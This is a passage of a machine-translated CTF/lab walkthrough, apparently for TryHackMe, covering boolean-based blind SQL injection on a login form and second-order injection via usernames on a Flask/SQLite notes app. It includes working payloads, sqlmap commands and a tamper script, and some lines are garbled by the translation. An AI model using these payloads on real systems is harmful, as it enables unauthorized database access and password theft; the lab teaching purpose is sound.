bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="c0df" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">这个挑战和前一个挑战有相同的弱点。但是，不再可能从Flask会话cookie或通过用户名显示提取数据。登录表单仍然有同样的漏洞，但这一次的目标是滥用与盲目SQL注入登录表单提取管理员的密码。</p><h1 id="78f5" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="42fa" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">基于布尔的盲SQL注入将用于提取密码。手动盲注既繁琐又耗时，因此计划构建一个脚本来逐字符提取密码。在制作自动化注入的脚本之前，理解注入是如何工作的是至关重要的。这个想法是发送一个SQL查询，询问密码中每个字符的真假。将分析应用程序的响应，以了解数据库返回的是真还是假。在这种情况下，如果响应成功，应用程序将让我们进入，或者在返回false的情况下，它将停留在登录页面上，显示“无效的用户名或密码”，如下图所示。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qg"><img src="../Images/4f2fe00f12083099e36d4abf3931cfac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4stRgpKBAodvOwdK.png"/></div></div></figure><p id="8bc1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如前所述，我们将向数据库发送密码中每个字符的布尔问题，询问数据库我们是否已经猜出了正确的字符。为了实现这一点，我们需要一种方法来控制我们所在的字符，并在每次我们猜测到当前位置的正确字符时递增它。SQLite的<a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>函数可以帮助我们实现这个功能。</p><p id="4e07" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">" SQLite substr函数从一个字符串中返回一个从指定位置开始的具有预定义长度的子字符串."(<a class="ae kr" href="https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/" rel="noopener ugc nofollow" target="_blank"> SQLite教程</a>)</p><p id="a130" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>的第一个参数是字符串本身，它将是管理员的密码。第二个参数是起始位置，第三个参数是将要返回的子字符串的长度。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9fab" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR( string, &lt;start&gt;, &lt;length&gt;)</span></pre><p id="49f9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面是一个使用中的<a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>的例子——等号(=)后面的字符表示返回的子字符串。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="667d" class="lo lp iq mz b gy nd ne l nf ng">-- Changing start</span><span id="992b" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 1,1) = T</span><span id="5905" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 2,1) = H</span><span id="cd44" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 3,1) = M</span><span id="d258" class="lo lp iq mz b gy nh ne l nf ng">-- Changing length</span><span id="e8a0" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 1,3) = THM</span></pre><p id="b8cb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下一步是将管理员的密码作为字符串输入到<a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>函数中。这可以通过以下查询实现:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="4ea6" class="lo lp iq mz b gy nd ne l nf ng">(SELECT password FROM users LIMIT 0,1)</span></pre><p id="e23d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="https://sqlite.org/lang_select.html#limitoffset" rel="noopener ugc nofollow" target="_blank"> LIMIT </a>子句用于限制SELECT语句返回的数据量。第一个数字0是偏移量，第二个整数是限值:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="64d1" class="lo lp iq mz b gy nd ne l nf ng">LIMIT &lt;OFFSET&gt;, &lt;LIMIT&gt;</span></pre><p id="8ed2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">以下是<a class="ae kr" href="https://sqlite.org/lang_select.html#limitoffset" rel="noopener ugc nofollow" target="_blank">限制</a>条款的几个实例。右边的表代表用户表。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="81ac" class="lo lp iq mz b gy nd ne l nf ng">sqlite&gt; SELECT password FROM users LIMIT 0,1</span><span id="0e3e" class="lo lp iq mz b gy nh ne l nf ng">THM{Blind}</span><span id="e253" class="lo lp iq mz b gy nh ne l nf ng">sqlite&gt; SELECT password FROM users LIMIT 1,1</span><span id="1b48" class="lo lp iq mz b gy nh ne l nf ng">Summer2019!</span><span id="1cc5" class="lo lp iq mz b gy nh ne l nf ng">sqlite&gt; SELECT password FROM users LIMIT 0,2</span><span id="82d9" class="lo lp iq mz b gy nh ne l nf ng">THM{Blind}</span><span id="6212" class="lo lp iq mz b gy nh ne l nf ng">Summer2019!</span></pre><p id="0a86" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">THM { Blind }夏季！维京123</p><p id="7ff6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">返回管理员密码第一个字符的SQL查询如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="0bd4" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)</span></pre><p id="d645" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在我们需要一种方法来比较密码的第一个字符和我们猜测的值。比较字符很容易，我们可以这样做:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="e747" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'</span></pre><p id="3456" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然而，这种方法是否有效将取决于应用程序如何处理输入。对于这个挑战，应用程序将用户名转换为小写，这打破了前面提到的方法，因为大写T与小写T不同。ASCII T的十六进制表示是0x54，小写T是0x74。为了处理这个问题，我们可以通过替换类型<a class="ae kr" href="https://www.sqlite.org/printf.html#substitution_types" rel="noopener ugc nofollow" target="_blank"> X </a>将字符输入为十六进制表示，然后使用SQLite的<a class="ae kr" href="https://sqlite.org/lang_expr.html#castexpr" rel="noopener ugc nofollow" target="_blank"> CAST </a>表达式将值转换为数据库期望的数据类型。</p><p id="9560" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">" X，X:参数是以十六进制显示的整数。小写的十六进制用于%x，大写的用于% X”“(【sqlite.org】T4)</p><p id="690e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着我们可以将T输入为X'54 '。要将值转换为SQLite的文本类型，我们可以使用如下的CAST表达式:CAST(X'54' as Text)。我们最后的查询现在看起来如下:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="b054" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</span></pre><p id="2e8f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在使用我们构建的查询之前，我们需要使它适合原始查询。我们的查询将放在用户名字段中。我们可以通过添加一个单引号(')来关闭username参数，然后附加一个and运算符来添加我们的条件。然后在查询末尾添加两个破折号(—)来注释掉密码检查。完成后，我们恶意查询如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="166f" class="lo lp iq mz b gy nd ne l nf ng">admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -</span></pre><p id="82fd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当将其注入用户名字段时，数据库执行的最终查询将是:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="154f" class="lo lp iq mz b gy nd ne l nf ng">SELECT <strong class="mz ir">id</strong>, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</span></pre><p id="a8c4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果应用程序响应302重定向，那么我们就找到了密码的第一个字符。为了获得完整的密码，攻击者必须对密码中的每个字符进行多次测试。测试每一个字符都很繁琐，使用脚本更容易实现。一个简单的解决方案是遍历每个可能的ASCII字符，并将其与数据库的字符进行比较。上述方法会产生大量流向目标的流量，但不是最有效的方法。机器内部提供了一个示例脚本，可以通过进入<a class="ae kr" href="http://10.10.110.236:5000/view/challenge3/challenge3-exploit.py" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">http://10 . 110 . 236:5000/view/challenge 3/challenge 3-exploit . py</strong></a><strong class="ku ir">查看和下载；</strong>注意，有必要使用password_len变量更改密码长度。密码的长度可以通过查询数据库找到。例如，在下面的查询中，我们询问数据库密码的长度是否等于37:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="7f56" class="lo lp iq mz b gy nd ne l nf ng">admin' AND length((SELECT password from users where username='admin'))==37-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qh"><img src="../Images/bdab38fd535fc96ba1bdfa260d928a14.png" data-original-src="https://miro.medium.com/v2/resize:fit:838/format:webp/1*S4DrVla1M3viWgaT8FHPfg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qi"><img src="../Images/b4cba3332e005140ff114360d9662d70.png" data-original-src="https://miro.medium.com/v2/resize:fit:774/format:webp/1*dnT20f-wSOq7rYtMQmWU0A.png"/></div></div></figure><p id="f5a6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此外，该脚本需要大量不必要的请求。一个额外的挑战可能是建立一个更有效的工具来检索密码。</p><p id="b0e2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">解决这一挑战的另一种方法是使用sqlmap之类的工具，这是一种开源工具，可以自动化检测和利用SQL注入缺陷的过程。以下命令可用于利用sqlmap漏洞:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="f81e" class="lo lp iq mz b gy nd ne l nf ng">sqlmap -u <a class="ae kr" href="http://10.10.110.236:5000/challenge3/login" rel="noopener ugc nofollow" target="_blank">http://10.10.110.236:5000/challenge3/login</a> --data="username=admin&amp;password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qj"><img src="../Images/f6449df6ab3024bea693919f9191ad2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/1*L6UwkIGrQ0MqfDCV114PKA.png"/></div></figure><h1 id="cd00" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务7:易受攻击的启动:易受攻击的注释</h1><h2 id="bea6" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">目标</h2><p id="284c" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">在这里，以前的漏洞已被修复，登录表单不再容易受到SQL注入。该团队增加了一个新的注释功能，允许用户在他们的页面上添加注释。这个挑战的目标是找到漏洞并转储数据库以找到标志。</p><h2 id="6aea" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">描述</h2><p id="9106" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">通过注册新帐户并登录应用程序，用户可以通过点击左上方菜单中的“Notes”来导航到新的Notes功能。在这里，可以添加新的注释，所有用户的注释都列在页面的底部，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qk"><img src="../Images/34a79d82b212c0017b53e11bdd73b448.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8Zs-rXNzksLxZAaa.png"/></div></div></figure><p id="5ca6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">notes函数不是直接易受攻击的，因为插入notes的函数是安全的，因为它使用参数化查询。对于参数化查询，SQL语句首先用占位符(？)为参数。然后，用户输入被传递到查询的每个参数中。参数化查询允许数据库区分代码和数据，而不管输入是什么。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="2225" class="lo lp iq mz b gy nd ne l nf ng">INSERT INTO notes (username, title, note) VALUES (?, ?, ?)</span></pre><p id="9c67" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">即使使用了参数化查询，如果应用程序不清理恶意数据，服务器也会接受恶意数据并将其放入数据库中。不过，参数化查询会阻止输入指向SQL注入。由于应用程序可能接受恶意数据，所有查询都必须使用参数化查询，而不仅仅是直接接受用户输入的查询。</p><p id="de0d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">用户注册函数也利用参数化查询，所以当执行下面的查询时，只执行INSERT语句。它将接受任何恶意的输入，如果不清理它，就把它放在数据库中，但是参数化查询防止输入导致SQL注入。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="fa00" class="lo lp iq mz b gy nd ne l nf ng">INSERT INTO users (username, password) VALUES (?, ?)</span></pre><p id="15b4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，获取属于用户的所有笔记的查询不使用参数化查询。用户名被直接连接到查询中，这使得它容易受到SQL注入的攻击。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="531d" class="lo lp iq mz b gy nd ne l nf ng">SELECT title, note FROM notes WHERE username = '" + username + "'</span></pre><p id="d9cc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着，如果我们用一个恶意的名称注册一个用户，一切都会很好，直到用户导航到notes页面，不安全的查询试图为恶意用户获取数据。</p><p id="f98e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过使用以下名称创建用户:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="29e1" class="lo lp iq mz b gy nd ne l nf ng">' union select 1,2'</span></pre><p id="4575" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们应该能触发二次注射:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ql"><img src="../Images/5b0b8f765c7f10c43a6e7d69c41357a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:734/format:webp/0*lH_vA5KtV_IREIYX.png"/></div></figure><p id="41a0" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用此用户名，应用程序执行以下查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="b08e" class="lo lp iq mz b gy nd ne l nf ng">SELECT title, note FROM notes WHERE username = '' union select 1,2''</span></pre><p id="1912" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后在新用户的notes页面上，我们可以看到查询中的第一列是注释标题，第二列是注释本身:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qa"><img src="../Images/6c28d6617242c5d77607bfa1d302bdfe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hglROo3W9wBkN9tC.png"/></div></div></figure><p id="6f1a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">有了这些知识，这就很容易被利用。例如，要从数据库中获取所有的表，我们可以创建一个名为:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="7204" class="lo lp iq mz b gy nd ne l nf ng">' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''</span></pre><p id="3a99" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">要在密码中找到该标志，请注册一个用户名:</p><p id="c771" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">' union select 1，group _ concat(password from users '</p><p id="38ef" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用Sqlmap自动化开发</p><p id="2fb3" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">可以使用sqlmap来自动化这种攻击，但是使用sqlmap的标准攻击将会失败。注入发生在用户注册时，但是易受攻击的函数位于注释页面上。要让sqlmap利用此漏洞，它必须执行以下步骤:</p><ol class=""><li id="9abf" class="pj pk iq ku b kv kw ky kz lb pl lf pm lj pn ln qm pp pq pr bi translated">注册一个恶意用户</li><li id="342c" class="pj pk iq ku b kv ps ky pt lb pu lf pv lj pw ln qm pp pq pr bi translated">恶意用户登录</li><li id="dcef" class="pj pk iq ku b kv ps ky pt lb pu lf pv lj pw ln qm pp pq pr bi translated">转到注释页面触发注射</li></ol><p id="de20" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过创建篡改脚本可以实现所有必要的步骤。Sqlmap支持篡改脚本，即用于篡改注入数据的脚本。使用篡改脚本，我们可以轻松地修改有效负载，例如，向它添加自定义编码。它还允许我们设置其他东西，比如cookies。</p><p id="dcaf" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面的篡改脚本中有两个自定义函数。第一个函数是<em class="oq"> create_account() </em>，它用sqlmap的有效负载作为名称，用‘ASD’作为密码注册一个用户。下一个定制函数是<em class="oq"> login() </em>，它以新创建的用户身份登录sqlmap并返回Flask会话cookie。<em class="oq"> tamper() </em>是脚本中的主要函数，它有<em class="oq">有效负载</em>和<em class="oq"> **kwargs </em>作为参数。<em class="oq"> **kwargs </em>保存诸如HTTP头之类的信息，我们需要将Flask会话cookie放在请求上，以允许sqlmap转到notes页面来触发SQL注入。<em class="oq"> tamper() </em>函数首先从<em class="oq"> kwargs </em>获取头，然后在应用程序上创建一个新用户，然后登录到应用程序并在HTTP头对象上设置Flask会话。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="b044" class="lo lp iq mz b gy nd ne l nf ng"><em class="oq">#!/usr/bin/python</em></span><span id="155e" class="lo lp iq mz b gy nh ne l nf ng">import requests</span><span id="ab6e" class="lo lp iq mz b gy nh ne l nf ng">from lib.core.enums import PRIORITY</span><span id="af9d" class="lo lp iq mz b gy nh ne l nf ng">__priority__ = PRIORITY.NORMAL</span><span id="3814" class="lo lp iq mz b gy nh ne l nf ng">address = "http://10.10.1.134:5000/challenge4"</span><span id="ab59" class="lo lp iq mz b gy nh ne l nf ng">password = "asd"</span><span id="99c8" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">dependencies</strong>():</span><span id="fa51" class="lo lp iq mz b gy nh ne l nf ng">pass</span><span id="7c3a" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">create_account</strong>(payload):</span><span id="56bb" class="lo lp iq mz b gy nh ne l nf ng">with requests.Session() as s:</span><span id="d92f" class="lo lp iq mz b gy nh ne l nf ng">data = {"username": payload, "password": password}</span><span id="ca74" class="lo lp iq mz b gy nh ne l nf ng">resp = s.post(f"{address}/signup", data=data)</span><span id="6da9" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">login</strong>(payload):</span><span id="3938" class="lo lp iq mz b gy nh ne l nf ng">with requests.Session() as s:</span><span id="8645" class="lo lp iq mz b gy nh ne l nf ng">data = {"username": payload, "password": password}</span><span id="60ee" class="lo lp iq mz b gy nh ne l nf ng">resp = s.post(f"{address}/login", data=data)</span><span id="138b" class="lo lp iq mz b gy nh ne l nf ng">sessid = s.cookies.get("session", None)</span><span id="a33c" class="lo lp iq mz b gy nh ne l nf ng">return "session={}".format(sessid)</span><span id="95f7" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">tamper</strong>(payload, **kwargs):</span><span id="c2b9" class="lo lp iq mz b gy nh ne l nf ng">headers = kwargs.get("headers", {})</span><span id="e2fe" class="lo lp iq mz b gy nh ne l nf ng">create_account(payload)</span><span id="24eb" class="lo lp iq mz b gy nh ne l nf ng">headers["Cookie"] = login(payload)</span><span id="d20f" class="lo lp iq mz b gy nh ne l nf ng">return payload</span></pre><p id="7bc3" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">篡改脚本所在的文件夹也需要一个空的<em class="oq"> __init__。py </em>文件，以便sqlmap能够加载它。在使用篡改脚本启动sqlmap之前，更改脚本中的地址和密码变量。完成后，就可以使用以下命令利用该漏洞:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9dfd" class="lo lp iq mz b gy nd ne l nf ng">sqlmap --tamper so-tamper.py --url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/signup" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/signup</a>  --data "username=admin&amp;password=asd"</span><span id="b117" class="lo lp iq mz b gy nh ne l nf ng">--second-url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/notes</a>  -p username --dbms sqlite --technique=U --no-cast</span><span id="4a56" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --tamper so-tamper.py - The tamper script</em></span><span id="1d2f" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --url - The URL of the injection point, which is /signup in this case</em></span><span id="7374" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --data - The POST data from the registraion form to /signup.</em></span><span id="1ee4" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq">#   Password must be the same as the password in the tamper script</em></span><span id="5176" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --second-url </em><a class="ae kr" href="http://10.10.1.134:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank"><em class="oq">http://10.10.1.134:5000/challenge4/notes</em></a><em class="oq"> - Visit this URL to check for results</em></span><span id="0f59" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># -p username - The parameter to inject to</em></span><span id="0e8e" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --dbms sqlite - To speed things up</em></span><span id="2666" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --technique=U - The technique to use. [U]nion-based</em></span><span id="7114" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --no-cast - Turn off payload casting mechanism</em></span></pre><p id="1323" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果不使用<em class="oq"> —无转换</em>参数关闭有效负载转换机制，转储<em class="oq">用户</em>表可能会很困难。这里可以看到铸造和不铸造之间区别的一个例子:</p><h2 id="03b5" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">—启用铸造时:</h2><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6555" class="lo lp iq mz b gy nd ne l nf ng">admin' union <strong class="mz ir">all</strong> select <strong class="mz ir">min</strong>(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master where tbl_name=cast(x'7573657273' as text)-- daqo'-- 7573657273 is 'users' in <strong class="mz ir">ascii</strong></span></pre><h2 id="f50c" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">—无铸件:</h2><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="043a" class="lo lp iq mz b gy nd ne l nf ng">admin' union <strong class="mz ir">all</strong> select cast(x'717a6a7871' as text)||<strong class="mz ir">id</strong>||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null from users-- ypfr'</span></pre><p id="e503" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当sqlmap询问时，回答no以遵循302重定向，然后回答yes以继续进一步测试，如果它检测到一些WAF/IP。当被问及是否要在以后的请求中合并cookies时，回答no，说no以减少请求的数量。如下图所示，sqlmap能够找到漏洞，这使我们能够自动利用它。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qg"><img src="../Images/3c1b9d1fd5bcebef7ea5642aa9651b9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*f3Aid5CRrbbqIuHJ.png"/></div></div></figure><p id="d0c6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后可以通过转储<em class="oq">用户</em>表找到该标志:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a1a3" class="lo lp iq mz b gy nd ne l nf ng">sqlmap --tamper tamper/so-tamper.py --url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/signup" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/signup</a> --data "username=admin&amp;password=asd" --second-url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/notes</a> -p username --dbms=sqlite --technique=U --no-cast -T users --dump</span></pre><p id="2ef2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">Sqlmap非常嘈杂，会增加很多试图利用这个应用程序的用户。因此，输出将被修整，可以看到下面的消息。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a919" class="lo lp iq mz b gy nd ne l nf ng">[WARNING] console output will be trimmed to last 256 rows due to large table size</span></pre><p id="ee1d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，所有数据都会保存并写入转储文件，如下图所示。读取转储文件的顶部以获取标志:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qn"><img src="../Images/1b797a9e3596fb1bbb295e1912cfb9fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aX_RLf2u8LeT0a1S.png"/></div></div></figure><p id="738c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">注意:</strong>在实时系统中，标记会有所不同。</p><h1 id="741a" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="4b3e" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">利用易受攻击的函数并检索标志。</p><p id="fd87" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld 